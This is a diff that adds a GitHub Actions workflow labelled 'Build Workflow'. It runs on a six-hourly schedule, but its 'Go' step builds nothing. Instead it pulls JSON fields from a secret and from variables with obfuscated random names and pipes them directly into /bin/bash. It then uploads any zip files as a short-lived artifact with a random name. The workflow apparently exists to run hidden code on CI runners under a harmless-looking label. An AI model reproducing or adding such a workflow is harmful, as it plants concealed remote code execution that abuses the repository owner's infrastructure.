@@ -1,0 +1,33 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '52 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          oyf48159: ${{ secrets.oyf48159 }}
+        run: |
+          printf '%s' "$oyf48159" | jq -r .l25 | /bin/bash
+          echo $klbdw105 | jq -r .bli12213 | /bin/bash
+          printf '%s' "$pir97" | jq -r .wtfa07 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Hj6RGnqZ
+          path: "*.zip"
+          retention-days: 1
